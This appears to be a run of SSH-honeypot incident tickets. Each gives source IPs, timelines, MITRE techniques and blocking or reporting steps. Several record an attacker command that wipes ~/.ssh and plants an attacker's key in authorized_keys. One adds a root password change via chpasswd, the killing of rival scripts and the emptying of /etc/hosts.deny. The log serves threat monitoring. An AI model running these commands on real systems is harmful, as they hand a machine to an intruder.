### 🔴 HIGH · IR-18b9fe675b01

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:56 |
| **Last Seen** | 2026-06-04 17:56 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:56:31` | `cowrie.session.connect` |
| `2026-06-04 17:56:31` | `cowrie.client.version` |
| `2026-06-04 17:56:31` | `cowrie.client.kex` |
| `2026-06-04 17:56:31` | `cowrie.login.success` |
| `2026-06-04 17:56:31` | `cowrie.session.params` |
| `2026-06-04 17:56:31` | `cowrie.command.input` |
| `2026-06-04 17:56:31` | `cowrie.command.failed` |
| `2026-06-04 17:56:32` | `cowrie.log.closed` |
| `2026-06-04 17:56:32` | `cowrie.session.params` |
| `2026-06-04 17:56:32` | `cowrie.command.input` |
| `2026-06-04 17:56:32` | `cowrie.session.file_download` |
| `2026-06-04 17:56:32` | `cowrie.log.closed` |
| `2026-06-04 17:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542706ef26ac

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 17:56 |
| **Last Seen** | 2026-06-04 17:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:56:34` | `cowrie.session.connect` |
| `2026-06-04 17:56:34` | `cowrie.client.version` |
| `2026-06-04 17:56:34` | `cowrie.client.kex` |
| `2026-06-04 17:56:34` | `cowrie.login.success` |
| `2026-06-04 17:56:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-41e0839e9d14

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 18:11 |
| **Last Seen** | 2026-06-04 18:11 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:11:00` | `cowrie.session.connect` |
| `2026-06-04 18:11:00` | `cowrie.client.version` |
| `2026-06-04 18:11:01` | `cowrie.client.kex` |
| `2026-06-04 18:11:01` | `cowrie.login.success` |
| `2026-06-04 18:11:01` | `cowrie.session.params` |
| `2026-06-04 18:11:01` | `cowrie.command.input` |
| `2026-06-04 18:11:01` | `cowrie.command.failed` |
| `2026-06-04 18:11:02` | `cowrie.log.closed` |
| `2026-06-04 18:11:02` | `cowrie.session.params` |
| `2026-06-04 18:11:02` | `cowrie.command.input` |
| `2026-06-04 18:11:02` | `cowrie.session.file_download` |
| `2026-06-04 18:11:02` | `cowrie.log.closed` |
| `2026-06-04 18:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb659f5cc622

| Field | Detail |
|---|---|
| **Source IP** | `156.239.224[.]79` |
| **First Seen** | 2026-06-04 18:11 |
| **Last Seen** | 2026-06-04 18:11 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:11:04` | `cowrie.session.connect` |
| `2026-06-04 18:11:04` | `cowrie.client.version` |
| `2026-06-04 18:11:04` | `cowrie.client.kex` |
| `2026-06-04 18:11:04` | `cowrie.login.success` |
| `2026-06-04 18:11:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `156.239.224[.]79` to AbuseIPDB if not already reported
- [ ] Block `156.239.224[.]79` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a4683dfc2a7

| Field | Detail |
|---|---|
| **Source IP** | `43.156.60[.]15` |
| **First Seen** | 2026-06-04 18:16 |
| **Last Seen** | 2026-06-04 18:16 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:16:15` | `cowrie.session.connect` |
| `2026-06-04 18:16:15` | `cowrie.client.version` |
| `2026-06-04 18:16:15` | `cowrie.client.kex` |
| `2026-06-04 18:16:15` | `cowrie.login.success` |
| `2026-06-04 18:16:15` | `cowrie.session.params` |
| `2026-06-04 18:16:15` | `cowrie.command.input` |
| `2026-06-04 18:16:15` | `cowrie.command.failed` |
| `2026-06-04 18:16:15` | `cowrie.log.closed` |
| `2026-06-04 18:16:15` | `cowrie.session.params` |
| `2026-06-04 18:16:15` | `cowrie.command.input` |
| `2026-06-04 18:16:15` | `cowrie.session.file_download` |
| `2026-06-04 18:16:15` | `cowrie.log.closed` |
| `2026-06-04 18:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.60[.]15` to AbuseIPDB if not already reported
- [ ] Block `43.156.60[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c3eccb686dd3

| Field | Detail |
|---|---|
| **Source IP** | `43.156.60[.]15` |
| **First Seen** | 2026-06-04 18:16 |
| **Last Seen** | 2026-06-04 18:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:16:17` | `cowrie.session.connect` |
| `2026-06-04 18:16:17` | `cowrie.client.version` |
| `2026-06-04 18:16:17` | `cowrie.client.kex` |
| `2026-06-04 18:16:17` | `cowrie.login.success` |
| `2026-06-04 18:16:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.156.60[.]15` to AbuseIPDB if not already reported
- [ ] Block `43.156.60[.]15` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3c7c81457cc

| Field | Detail |
|---|---|
| **Source IP** | `14.29.240[.]154` |
| **First Seen** | 2026-06-04 18:22 |
| **Last Seen** | 2026-06-04 18:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:22:38` | `cowrie.session.connect` |
| `2026-06-04 18:22:38` | `cowrie.client.version` |
| `2026-06-04 18:22:38` | `cowrie.client.kex` |
| `2026-06-04 18:22:39` | `cowrie.login.success` |
| `2026-06-04 18:22:40` | `cowrie.session.params` |
| `2026-06-04 18:22:40` | `cowrie.command.input` |
| `2026-06-04 18:22:40` | `cowrie.command.failed` |
| `2026-06-04 18:22:40` | `cowrie.log.closed` |
| `2026-06-04 18:22:40` | `cowrie.session.params` |
| `2026-06-04 18:22:40` | `cowrie.command.input` |
| `2026-06-04 18:22:41` | `cowrie.session.file_download` |
| `2026-06-04 18:22:41` | `cowrie.log.closed` |
| `2026-06-04 18:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.240[.]154` to AbuseIPDB if not already reported
- [ ] Block `14.29.240[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-173b21f0a2c6

| Field | Detail |
|---|---|
| **Source IP** | `14.29.240[.]154` |
| **First Seen** | 2026-06-04 18:22 |
| **Last Seen** | 2026-06-04 18:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:22:47` | `cowrie.session.connect` |
| `2026-06-04 18:22:47` | `cowrie.client.version` |
| `2026-06-04 18:22:47` | `cowrie.client.kex` |
| `2026-06-04 18:22:48` | `cowrie.login.success` |
| `2026-06-04 18:22:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.240[.]154` to AbuseIPDB if not already reported
- [ ] Block `14.29.240[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-247fd0ea1451

| Field | Detail |
|---|---|
| **Source IP** | `14.29.240[.]154` |
| **First Seen** | 2026-06-04 18:25 |
| **Last Seen** | 2026-06-04 18:25 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:25:27` | `cowrie.session.connect` |
| `2026-06-04 18:25:27` | `cowrie.client.version` |
| `2026-06-04 18:25:27` | `cowrie.client.kex` |
| `2026-06-04 18:25:29` | `cowrie.login.success` |
| `2026-06-04 18:25:29` | `cowrie.session.params` |
| `2026-06-04 18:25:29` | `cowrie.command.input` |
| `2026-06-04 18:25:29` | `cowrie.command.failed` |
| `2026-06-04 18:25:30` | `cowrie.log.closed` |
| `2026-06-04 18:25:30` | `cowrie.session.params` |
| `2026-06-04 18:25:30` | `cowrie.command.input` |
| `2026-06-04 18:25:30` | `cowrie.session.file_download` |
| `2026-06-04 18:25:30` | `cowrie.log.closed` |
| `2026-06-04 18:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.240[.]154` to AbuseIPDB if not already reported
- [ ] Block `14.29.240[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e978d44f4016

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:25 |
| **Last Seen** | 2026-06-04 18:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:25:36` | `cowrie.session.connect` |
| `2026-06-04 18:25:36` | `cowrie.client.version` |
| `2026-06-04 18:25:36` | `cowrie.client.kex` |
| `2026-06-04 18:25:36` | `cowrie.login.success` |
| `2026-06-04 18:25:37` | `cowrie.session.params` |
| `2026-06-04 18:25:37` | `cowrie.command.input` |
| `2026-06-04 18:25:37` | `cowrie.command.failed` |
| `2026-06-04 18:25:37` | `cowrie.log.closed` |
| `2026-06-04 18:25:37` | `cowrie.session.params` |
| `2026-06-04 18:25:37` | `cowrie.command.input` |
| `2026-06-04 18:25:37` | `cowrie.session.file_download` |
| `2026-06-04 18:25:37` | `cowrie.log.closed` |
| `2026-06-04 18:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e562ff45680

| Field | Detail |
|---|---|
| **Source IP** | `14.29.240[.]154` |
| **First Seen** | 2026-06-04 18:25 |
| **Last Seen** | 2026-06-04 18:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:25:37` | `cowrie.session.connect` |
| `2026-06-04 18:25:37` | `cowrie.client.version` |
| `2026-06-04 18:25:37` | `cowrie.client.kex` |
| `2026-06-04 18:25:38` | `cowrie.login.success` |
| `2026-06-04 18:25:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.240[.]154` to AbuseIPDB if not already reported
- [ ] Block `14.29.240[.]154` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a53cc1fbb6c

| Field | Detail |
|---|---|
| **Source IP** | `58.229.253[.]119` |
| **First Seen** | 2026-06-04 18:25 |
| **Last Seen** | 2026-06-04 18:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:25:39` | `cowrie.session.connect` |
| `2026-06-04 18:25:39` | `cowrie.client.version` |
| `2026-06-04 18:25:39` | `cowrie.client.kex` |
| `2026-06-04 18:25:40` | `cowrie.login.success` |
| `2026-06-04 18:25:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.229.253[.]119` to AbuseIPDB if not already reported
- [ ] Block `58.229.253[.]119` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-130573c3a5af

| Field | Detail |
|---|---|
| **Source IP** | `14.29.240[.]154` |
| **First Seen** | 2026-06-04 18:25 |
| **Last Seen** | 2026-06-04 18:26 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:X0LizIErIgAW"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:25:57` | `cowrie.session.connect` |
| `2026-06-04 18:25:57` | `cowrie.client.version` |
| `2026-06-04 18:25:57` | `cowrie.client.kex` |
| `2026-06-04 18:25:58` | `cowrie.login.success` |
| `2026-06-04 18:25:59` | `cowrie.session.params` |
| `2026-06-04 18:25:59` | `cowrie.command.input` |
| `2026-06-04 18:25:59` | `cowrie.command.failed` |
| `2026-06-04 18:25:59` | `cowrie.log.closed` |
| `2026-06-04 18:26:00` | `cowrie.session.params` |
| `2026-06-04 18:26:00` | `cowrie.command.input` |
| `2026-06-04 18:26:00` | `cowrie.session.file_download` |
| `2026-06-04 18:26:00` | `cowrie.log.closed` |
| `2026-06-04 18:26:12` | `cowrie.session.params` |
| `2026-06-04 18:26:12` | `cowrie.command.input` |
| `2026-06-04 18:26:12` | `cowrie.log.closed` |
| `2026-06-04 18:26:13` | `cowrie.session.params` |
| `2026-06-04 18:26:13` | `cowrie.command.input` |
| `2026-06-04 18:26:13` | `cowrie.log.closed` |
| `2026-06-04 18:26:14` | `cowrie.session.params` |
| `2026-06-04 18:26:14` | `cowrie.command.input` |
| `2026-06-04 18:26:14` | `cowrie.session.file_download` |
| `2026-06-04 18:26:14` | `cowrie.log.closed` |
| `2026-06-04 18:26:15` | `cowrie.session.params` |
| `2026-06-04 18:26:15` | `cowrie.command.input` |
| `2026-06-04 18:26:15` | `cowrie.log.closed` |
| `2026-06-04 18:26:16` | `cowrie.session.params` |
| `2026-06-04 18:26:16` | `cowrie.command.input` |
| `2026-06-04 18:26:16` | `cowrie.log.closed` |
| `2026-06-04 18:26:16` | `cowrie.session.params` |
| `2026-06-04 18:26:16` | `cowrie.command.input` |
| `2026-06-04 18:26:16` | `cowrie.command.input` |
| `2026-06-04 18:26:17` | `cowrie.log.closed` |
| `2026-06-04 18:26:17` | `cowrie.session.params` |
| `2026-06-04 18:26:17` | `cowrie.command.input` |
| `2026-06-04 18:26:17` | `cowrie.log.closed` |
| `2026-06-04 18:26:18` | `cowrie.session.params` |
| `2026-06-04 18:26:18` | `cowrie.command.input` |
| `2026-06-04 18:26:18` | `cowrie.log.closed` |
| `2026-06-04 18:26:19` | `cowrie.session.params` |
| `2026-06-04 18:26:19` | `cowrie.command.input` |
| `2026-06-04 18:26:19` | `cowrie.log.closed` |
| `2026-06-04 18:26:20` | `cowrie.session.params` |
| `2026-06-04 18:26:20` | `cowrie.command.input` |
| `2026-06-04 18:26:20` | `cowrie.log.closed` |
| `2026-06-04 18:26:21` | `cowrie.session.params` |
| `2026-06-04 18:26:21` | `cowrie.command.input` |
| `2026-06-04 18:26:21` | `cowrie.log.closed` |
| `2026-06-04 18:26:21` | `cowrie.session.params` |
| `2026-06-04 18:26:21` | `cowrie.command.input` |
| `2026-06-04 18:26:22` | `cowrie.log.closed` |
| `2026-06-04 18:26:22` | `cowrie.session.params` |
| `2026-06-04 18:26:22` | `cowrie.command.input` |
| `2026-06-04 18:26:22` | `cowrie.log.closed` |
| `2026-06-04 18:26:23` | `cowrie.session.params` |
| `2026-06-04 18:26:23` | `cowrie.command.input` |
| `2026-06-04 18:26:23` | `cowrie.log.closed` |
| `2026-06-04 18:26:24` | `cowrie.session.params` |
| `2026-06-04 18:26:24` | `cowrie.command.input` |
| `2026-06-04 18:26:24` | `cowrie.log.closed` |
| `2026-06-04 18:26:25` | `cowrie.session.params` |
| `2026-06-04 18:26:25` | `cowrie.command.input` |
| `2026-06-04 18:26:25` | `cowrie.log.closed` |
| `2026-06-04 18:26:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.240[.]154` to AbuseIPDB if not already reported
- [ ] Block `14.29.240[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cdad7dda2513

| Field | Detail |
|---|---|
| **Source IP** | `14.29.240[.]154` |
| **First Seen** | 2026-06-04 18:27 |
| **Last Seen** | 2026-06-04 18:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 18:27:39` | `cowrie.session.connect` |
| `2026-06-04 18:27:39` | `cowrie.client.version` |
| `2026-06-04 18:27:39` | `cowrie.client.kex` |
| `2026-06-04 18:27:40` | `cowrie.login.success` |
| `2026-06-04 18:27:41` | `cowrie.session.params` |
| `2026-06-04 18:27:41` | `cowrie.command.input` |
| `2026-06-04 18:27:41` | `cowrie.command.failed` |
| `2026-06-04 18:27:41` | `cowrie.log.closed` |
| `2026-06-04 18:27:42` | `cowrie.session.params` |
| `2026-06-04 18:27:42` | `cowrie.command.input` |
| `2026-06-04 18:27:42` | `cowrie.session.file_download` |
| `2026-06-04 18:27:42` | `cowrie.log.closed` |
| `2026-06-04 18:27:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.29.240[.]154` to AbuseIPDB if not already reported
- [ ] Block `14.29.240[.]154` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-effbd0e6c2e7

| Field | Detail |
|---|---|
| **Source IP** | `14.29.240[.]154` |
